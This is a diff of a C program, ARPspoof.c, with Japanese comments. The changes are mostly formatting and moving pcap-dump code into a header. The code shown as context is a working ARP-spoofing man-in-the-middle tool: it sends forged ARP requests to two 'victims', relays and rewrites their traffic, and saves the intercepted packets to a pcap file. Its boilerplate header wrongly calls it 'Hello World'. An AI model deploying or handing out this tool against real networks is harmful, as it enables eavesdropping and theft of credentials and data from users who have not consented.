@@ -1,3 +1,13 @@
+/*
+ ============================================================================
+ Name        : ARPspoof.c
+ Author      : 
+ Version     :
+ Copyright   : Your copyright notice
+ Description : Hello World in C, Ansi-style
+ ============================================================================
+ */
+
 #include	<stdio.h>
 #include    <stdlib.h>
 #include	<string.h>
@@ -13,10 +23,12 @@
 #include    <linux/if.h>
 #include    <netinet/ip.h>
 #include    <pthread.h>
-#include	"netutil.h"
 #include    <unistd.h>
 #include    <sys/time.h>
 #include    <signal.h>
+
+#include	"netutil.h"
+#include   "pcap_dump.h"
 
 uint8_t bytes[6];
 
@@ -24,7 +36,7 @@ typedef struct	{
     char	*Device1;
     char	*Device2;
     int	DebugOut;
-    
+
     char    *ip_A;
     char    *ip_B;
     char    *mac_A;
@@ -51,12 +63,12 @@ int DebugPrintf(char *fmt,...)
 {
     if(Param.DebugOut){
         va_list	args;
-        
+
         va_start(args,fmt);
         vfprintf(stderr,fmt,args);
         va_end(args);
     }
-    
+
     return(0);
 }
 
@@ -65,14 +77,14 @@ int DebugPerror(char *msg)
     if(Param.DebugOut){
         fprintf(stderr,"%s : %s\n",msg,strerror(errno));
     }
-    
+
     return(0);
 }
 
 int str2macaddr(char *macstr, uint8_t macaddr[6]){
     int values[6];
     int i;
-    
+
     if( 6 == sscanf( macstr, "%x:%x:%x:%x:%x:%x%c",
                     &values[0], &values[1], &values[2],
                     &values[3], &values[4], &values[5] ) )
@@ -95,10 +107,10 @@ int AnalyzePacket(int deviceNo,u_char *data,int size)
     u_char	*ptr;
     int	lest;
     struct ether_header	*eh;
-    
+
     ptr=data;
     lest=size;
-    
+
     if(lest<sizeof(struct ether_header)){
         DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_header)\n",deviceNo,lest);
         return(-1);
@@ -107,82 +119,17 @@ int AnalyzePacket(int deviceNo,u_char *data,int size)
     ptr+=sizeof(struct ether_header);
     lest-=sizeof(struct ether_header);
     DebugPrintf("[%d]",deviceNo);
-    
-    
+
+
     if(Param.DebugOut){
         PrintEtherHeader(eh,stderr);
     }
-    
+
     return(0);
 }
 
 
-//---pcapDump用----
-#define TCPDUMP_MAGIC 0xa1b2c3d4
-#define PCAP_VERSION_MAJOR 2
-#define PCAP_VERSION_MINOR 4
-#define DLT_EN10MB 1
 
-//pcapファイルの先頭に書き込む
-struct pcap_file_header{
-    uint32_t magic;
-    uint16_t version_major;
-    uint16_t version_minor;
-    int32_t thiszone;   //タイムゾーン。GMT+1:00なら-3600になるらしいが、tcpdumpはここを0でダンプするのでそれに合わせる
-    uint32_t sigfigs;
-    uint32_t snaplen;   //最大パケット長。0xFF、つまり65535を指定するらしいが、このプログラムは2048までしか対応していない
-    uint32_t linktype;
-};
-
-char pcapDumpFileName[50] = "pcapDump.pcap";    //保存するpcapファイル名
-
-//pcapファイルを準備
-void pcap_init(){
-    struct pcap_file_header *pfhdr =  (struct pcap_file_header *) malloc(sizeof(struct pcap_file_header));
-    pfhdr->magic = TCPDUMP_MAGIC;
-    pfhdr->version_major = PCAP_VERSION_MAJOR;
-    pfhdr->version_minor = PCAP_VERSION_MINOR;
-    pfhdr->thiszone = 0;   //前述の通り、tcpdumpに合わせて0にしてしまう
-    pfhdr->snaplen = 65535;
-    pfhdr->sigfigs = 0;
-    pfhdr->linktype = DLT_EN10MB;
-
-    FILE *fpw = fopen(pcapDumpFileName, "ab");
-    fwrite(pfhdr, sizeof(struct pcap_file_header), 1, fpw);
-    fclose(fpw);
-
-    free(pfhdr);
-}
-
-//パケットの先頭に書き込む
-struct pcap_pkthdr{
-    //struct timeval ts; //この構造体を用いると、x86とx64の違いなのか、ひとつ64bitで保存されてしまいズレる
-    uint32_t ts_sec;    //このように32bitで保存しとく
-    uint32_t ts_usec;
-
-    uint32_t caplen;
-    uint32_t len;
-};
-
-//パケット追記する
-void pcap_write(u_char *data, int dsize){
-    struct pcap_pkthdr pkthdr;
-    struct timeval ts;
-    struct timezone tz;
-    gettimeofday(&ts, &tz);
-
-    pkthdr.ts_sec = (uint32_t)ts.tv_sec;
-    pkthdr.ts_usec = (uint32_t)ts.tv_usec;
-    pkthdr.caplen = dsize;
-    pkthdr.len = dsize;
-    
-    FILE *fpw = fopen(pcapDumpFileName, "ab");
-    fwrite(&pkthdr, sizeof(struct pcap_pkthdr), 1, fpw);
-    fwrite(data, dsize, 1, fpw);
-    fclose(fpw);
-}
-
-//---pcapDump用ここまで----
 
 
 //MITMパケットを検出し、IPアドレスとMACアドレスを書き換えとく
@@ -193,10 +140,10 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
     char    buf[80];
     int    tno;
     u_char    hwaddr[6];
-    
+
     ptr=data;
     lest=size;
-    
+
     //イーサヘッダの分離
     if(lest<sizeof(struct ether_header)){
         DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_header)\n",deviceNo,lest);
@@ -206,18 +153,18 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
     eh=(struct ether_header *)ptr;
     ptr+=sizeof(struct ether_header);
     lest-=sizeof(struct ether_header);
-    
+
     //宛先MACアドレスがこのNICでなかったらそもそも違う
     if(memcmp(&eh->ether_dhost,Device[deviceNo].hwaddr,6)!=0){
         DebugPrintf("[%d]:dhost not match %s\n",deviceNo,my_ether_ntoa_r((u_char *)&eh->ether_dhost,buf,sizeof(buf)));
         //そもそも見なくて良い
         return(-1);
     }
-    
+
     //判別
     if(ntohs(eh->ether_type)==ETHERTYPE_ARP){
         struct ether_arp    *arp;
-        
+
         if(lest<sizeof(struct ether_arp)){
             DebugPrintf("[%d]:lest(%d)<sizeof(struct ether_arp)\n",deviceNo,lest);
             return(-1);
@@ -225,7 +172,7 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         arp=(struct ether_arp *)ptr;
         ptr+=sizeof(struct ether_arp);
         lest-=sizeof(struct ether_arp);
-        
+
         if(arp->arp_op==htons(ARPOP_REQUEST)){
             DebugPrintf("[%d]recv:ARP REQUEST:%dbytes\n",deviceNo,size);
             //Ip2Mac(deviceNo,*(in_addr_t *)arp->arp_spa,arp->arp_sha);
@@ -234,7 +181,7 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
             DebugPrintf("[%d]recv:ARP REPLY:%dbytes\n",deviceNo,size);
             //Ip2Mac(deviceNo,*(in_addr_t *)arp->arp_spa,arp->arp_sha);
         }
-        
+
         //送信者かつ受信者のIPv4アドレスをチェック
         int isAtoB = *(in_addr_t *)arp->arp_spa == send_ip && *(in_addr_t *)arp->arp_tpa == rec_ip;
         int isBtoA = *(in_addr_t *)arp->arp_spa == rec_ip && *(in_addr_t *)arp->arp_tpa == send_ip;
@@ -249,7 +196,7 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         struct iphdr    *iphdr;
         u_char    option[1500];
         int    optionLen;
-        
+
         if(lest<sizeof(struct iphdr)){
             DebugPrintf("[%d]:lest(%d)<sizeof(struct iphdr)\n",deviceNo,lest);
             return(-1);
@@ -257,14 +204,14 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         iphdr=(struct iphdr *)ptr;
         ptr+=sizeof(struct iphdr);
         lest-=sizeof(struct iphdr);
-        
+
         struct in_addr tempS, tempR;
         tempS.s_addr = iphdr->saddr;
         tempR.s_addr = iphdr->daddr;
         DebugPrintf("IP PACKET: %s to %s\n",inet_ntoa(tempS), inet_ntoa(tempR));
-       
-        int isAtoB = (iphdr->saddr == send_ip && iphdr->daddr == rec_ip); 
-        int isBtoA = (iphdr->saddr == rec_ip && iphdr->daddr == send_ip); 
+
+        int isAtoB = (iphdr->saddr == send_ip && iphdr->daddr == rec_ip);
+        int isBtoA = (iphdr->saddr == rec_ip && iphdr->daddr == send_ip);
         //AからBへの通信のときは、IPアドレスとMACアドレスを入れ替えとく。
         if(isAtoB || isBtoA){
             pcap_write(data, size);
@@ -283,7 +230,7 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
             return(1);
         }
     }
-    
+
     return(0);
 }
 
@@ -292,14 +239,14 @@ int MITMBridge(in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_
     struct pollfd    targets[2];
     int    nready,i,size;
     u_char    buf[2048];
-    
+
     targets[0].fd=Device[0].soc;
     targets[0].events=POLLIN|POLLERR;
     targets[1].fd=Device[1].soc;
     targets[1].events=POLLIN|POLLERR;
-    
+
     int deviceNo = 0;   //使うネットワークデバイス
-    
+
     while(EndFlag==0){
         switch(nready=poll(targets,2,100)){
             case    -1:
@@ -310,7 +257,7 @@ int MITMBridge(in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_
             case    0:
                 break;
             default:
-                
+
                 if(targets[deviceNo].revents&(POLLIN|POLLERR)){
                     if((size=read(Device[deviceNo].soc,buf,sizeof(buf)))<=0){
                         perror("read");
@@ -327,12 +274,12 @@ int MITMBridge(in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_
                             }
                         }
                     }
-                    
+
                 }
                 break;
         }
     }
-    
+
     return (0);
 }
 
@@ -341,12 +288,12 @@ int Bridge()
     struct pollfd	targets[2];
     int	nready,i,size;
     u_char	buf[2048];
-    
+
     targets[0].fd=Device[0].soc;
     targets[0].events=POLLIN|POLLERR;
     targets[1].fd=Device[1].soc;
     targets[1].events=POLLIN|POLLERR;
-    
+
     while(EndFlag==0){
         switch(nready=poll(targets,2,100)){
             case	-1:
@@ -374,21 +321,21 @@ int Bridge()
                 break;
         }
     }
-    
+
     return(0);
 }
 
 int DisableIpForward()
 {
     FILE    *fp;
-    
+
     if((fp=fopen("/proc/sys/net/ipv4/ip_forward","w"))==NULL){
         DebugPrintf("cannot write /proc/sys/net/ipv4/ip_forward\n");
         return(-1);
     }
     fputs("0",fp);
     fclose(fp);
-    
+
     return(0);
 }
 
@@ -414,56 +361,56 @@ int SendArpRequestB(int soc,in_addr_t target_ip,u_char target_mac[6],in_addr_t m
         u_char   c[4];
     }lc;
     int     i;
-    
+
     arp.arp.arp_hrd=htons(ARPHRD_ETHER);
     arp.arp.arp_pro=htons(ETHERTYPE_IP);
     arp.arp.arp_hln=6;
     arp.arp.arp_pln=4;
     arp.arp.arp_op=htons(ARPOP_REQUEST);
-    
+
     for(i=0;i<6;i++){
         arp.arp.arp_sha[i]=my_mac[i];
     }
-    
+
     for(i=0;i<6;i++){
         arp.arp.arp_tha[i]=0;
     }
-    
+
     lc.l=my_ip;
     for(i=0;i<4;i++){
         arp.arp.arp_spa[i]=lc.c[i];
     }
-    
+
     lc.l=target_ip;
     for(i=0;i<4;i++){
         arp.arp.arp_tpa[i]=lc.c[i];
     }
-    
-    
+
+
     arp.eh.ether_dhost[0]=target_mac[0];
     arp.eh.ether_dhost[1]=target_mac[1];
     arp.eh.ether_dhost[2]=target_mac[2];
     arp.eh.ether_dhost[3]=target_mac[3];
     arp.eh.ether_dhost[4]=target_mac[4];
     arp.eh.ether_dhost[5]=target_mac[5];
-    
+
     arp.eh.ether_shost[0]=my_mac[0];
     arp.eh.ether_shost[1]=my_mac[1];
     arp.eh.ether_shost[2]=my_mac[2];
     arp.eh.ether_shost[3]=my_mac[3];
     arp.eh.ether_shost[4]=my_mac[4];
     arp.eh.ether_shost[5]=my_mac[5];
-    
+
     arp.eh.ether_type=htons(ETHERTYPE_ARP);
-    
+
     memset(buf,0,sizeof(buf));
     p=buf;
     memcpy(p,&arp.eh,sizeof(struct ether_header));p+=sizeof(struct ether_header);
     memcpy(p,&arp.arp,sizeof(struct ether_arp));p+=sizeof(struct ether_arp);
     total=p-buf;
-    
+
     write(soc,buf,total);
-    
+
     return(0);
 }
 //--------------
@@ -474,15 +421,15 @@ int GetDeviceInfo(char *device,u_char hwaddr[6],struct in_addr *uaddr,struct in_
     struct sockaddr_in    addr;
     int    soc;
     u_char    *p;
-    
+
     if((soc=socket(PF_INET,SOCK_DGRAM,0))<0){
         DebugPerror("socket");
         return(-1);
     }
-    
+
     memset(&ifreq,0,sizeof(struct ifreq));
     strncpy(ifreq.ifr_name,device,sizeof(ifreq.ifr_name)-1);
-    
+
     if(ioctl(soc,SIOCGIFHWADDR,&ifreq)==-1){
         DebugPerror("ioctl");
         close(soc);
@@ -492,7 +439,7 @@ int GetDeviceInfo(char *device,u_char hwaddr[6],struct in_addr *uaddr,struct in_
         p=(u_char *)&ifreq.ifr_hwaddr.sa_data;
         memcpy(hwaddr,p,6);
     }
-    
+
     if(ioctl(soc,SIOCGIFADDR,&ifreq)==-1){
         DebugPerror("ioctl");
         close(soc);
@@ -507,8 +454,8 @@ int GetDeviceInfo(char *device,u_char hwaddr[6],struct in_addr *uaddr,struct in_
         memcpy(&addr,&ifreq.ifr_addr,sizeof(struct sockaddr_in));
         *uaddr=addr.sin_addr;
     }
-    
-    
+
+
     if(ioctl(soc,SIOCGIFNETMASK,&ifreq)==-1){
         DebugPerror("ioctl");
         close(soc);
@@ -518,18 +465,18 @@ int GetDeviceInfo(char *device,u_char hwaddr[6],struct in_addr *uaddr,struct in_
         memcpy(&addr,&ifreq.ifr_addr,sizeof(struct sockaddr_in));
         *mask=addr.sin_addr;
     }
-    
+
     subnet->s_addr=((uaddr->s_addr)&(mask->s_addr));
-    
+
     close(soc);
-    
+
     return(0);
 }
 
 char *my_inet_ntoa_r(struct in_addr *addr,char *buf,socklen_t size)
 {
     inet_ntop(PF_INET,addr,buf,size);
-    
+
     return(buf);
 }
 //--------------
@@ -547,7 +494,7 @@ void *arpspoof(void *p){
     struct argArp  *arg = (struct argArp *)p;
     while(1){
         SendArpRequestB(arg->soc, arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
-        usleep(10*1000000);    
+        usleep(10*1000000);
     }
 
     return (NULL);
@@ -564,7 +511,7 @@ void *StartMITMBridge(void *p){
 int main(int argc,char *argv[],char *envp[])
 {
     char    buf[80];
-    
+
     //----デバイスセッティング
     if(GetDeviceInfo(Param.Device1,Device[0].hwaddr,&Device[0].addr,&Device[0].subnet,&Device[0].netmask)==-1){
         DebugPrintf("GetDeviceInfo:error:%s\n",Param.Device1);
@@ -578,7 +525,7 @@ int main(int argc,char *argv[],char *envp[])
     DebugPrintf("addr=%s\n",my_inet_ntoa_r(&Device[0].addr,buf,sizeof(buf)));
     DebugPrintf("subnet=%s\n",my_inet_ntoa_r(&Device[0].subnet,buf,sizeof(buf)));
     DebugPrintf("netmask=%s\n",my_inet_ntoa_r(&Device[0].netmask,buf,sizeof(buf)));
-    
+
     if(GetDeviceInfo(Param.Device2,Device[1].hwaddr,&Device[1].addr,&Device[1].subnet,&Device[1].netmask)==-1){
         DebugPrintf("GetDeviceInfo:error:%s\n",Param.Device2);
         return(-1);
@@ -592,27 +539,27 @@ int main(int argc,char *argv[],char *envp[])
     DebugPrintf("subnet=%s\n",my_inet_ntoa_r(&Device[1].subnet,buf,sizeof(buf)));
     DebugPrintf("netmask=%s\n",my_inet_ntoa_r(&Device[1].netmask,buf,sizeof(buf)));
     //----デバイスセッティングここまで
-    
+
     DisableIpForward();
-    
+
     signal(SIGINT,EndSignal);
     signal(SIGTERM,EndSignal);
     signal(SIGQUIT,EndSignal);
-    
+
     signal(SIGPIPE,SIG_IGN);
     signal(SIGTTIN,SIG_IGN);
     signal(SIGTTOU,SIG_IGN);
-    
+
     DebugPrintf("bridge start\n");
-    
+
     //スレッド関係の変数
     pthread_t arpTid;
     pthread_t arpTid_r;
     pthread_t bridgeTid;
     pthread_attr_t  attr;
-    
+
     pthread_attr_init(&attr);
-    
+
     //static  u_char    mac_B[6]={0x00,0x25,0x36,0xC3,0x74,0x16};  //router
     static  u_char    mac_A[6];  //MBP
     str2macaddr(Param.mac_A, mac_A);
@@ -626,7 +573,7 @@ int main(int argc,char *argv[],char *envp[])
     char    *in_addr_text_receiver = Param.ip_B;                   //ARPスプーフィング先B (A→Bの通信を横取りする)
     struct  in_addr    sendIp;
     struct  in_addr    recIp;
-    
+
     inet_aton(in_addr_text_sender, &sendIp);
     inet_aton(in_addr_text_receiver, &recIp);
 
@@ -638,7 +585,7 @@ int main(int argc,char *argv[],char *envp[])
     //MACaddrのコピー
     memcpy(arg_arpspoof.mac_d, mac_A, 6);
     memcpy(arg_arpspoof.mac_s, Device[0].hwaddr, 6);
-   
+
     //A→BのARPスプーフィング開始。ARPリクエストを送りつける
     int status;
     if((status=pthread_create(&arpTid,&attr, arpspoof, &arg_arpspoof))!=0){
@@ -646,7 +593,7 @@ int main(int argc,char *argv[],char *envp[])
     }
 
     //IPAddrを入れ替えただけ
-    
+
     //スレッド用引数の準備
     struct argArp arg_arpspoof_r;
     arg_arpspoof_r.soc = Device[0].soc;
@@ -655,19 +602,19 @@ int main(int argc,char *argv[],char *envp[])
     //MACaddrのコピー
     memcpy(arg_arpspoof_r.mac_d, mac_B, 6);
     memcpy(arg_arpspoof_r.mac_s, Device[0].hwaddr, 6);
-  
+
     //B→AのARPスプーフィング開始。ARPリクエストを送りつける
     if((status=pthread_create(&arpTid_r,&attr, arpspoof, &arg_arpspoof_r))!=0){
         DebugPrintf("pthread_create:%s\n",strerror(status));
     }
-    
-    
-    
-    
+
+
+
+
 
     //---ARPスプーフィングここまで
     //---ブリッジ
-    
+
     //スレッド用引数の準備
     struct argArp arg_bridge;
     arg_bridge.soc  = Device[0].soc;
@@ -676,7 +623,7 @@ int main(int argc,char *argv[],char *envp[])
     //MACaddrのコピー
     memcpy(arg_bridge.mac_d, mac_A, 6);
     memcpy(arg_bridge.mac_s, mac_B, 6);
-   
+
     //pcapダンプ用意
     pcap_init();
 
@@ -684,7 +631,7 @@ int main(int argc,char *argv[],char *envp[])
     if((status=pthread_create(&bridgeTid,&attr, StartMITMBridge, &arg_bridge))!=0){
         DebugPrintf("pthread_create:%s\n",strerror(status));
     }
-    
+
     //Bridge();
     //---ブリッジここまで
     DebugPrintf("bridge end\n");
@@ -724,7 +671,7 @@ int main(int argc,char *argv[],char *envp[])
     pthread_join(arpTid     , NULL);
     pthread_join(arpTid_r   , NULL);
     pthread_join(bridgeTid  , NULL);
-   
+
     //victimたちのARPテーブルの修復(ARPスプーフィングのときと違い、送信元MACaddrが正しい)
     SendArpRequestB(arg_arpspoof.soc, arg_arpspoof.ip_d, arg_arpspoof.mac_d, arg_arpspoof.ip_s, arg_arpspoof_r.mac_d);
     SendArpRequestB(arg_arpspoof_r.soc, arg_arpspoof_r.ip_d, arg_arpspoof_r.mac_d, arg_arpspoof_r.ip_s, arg_arpspoof.mac_d);
@@ -732,7 +679,7 @@ int main(int argc,char *argv[],char *envp[])
 
     close(Device[0].soc);
     close(Device[1].soc);
-    
+
     return(0);
-    
+
 }
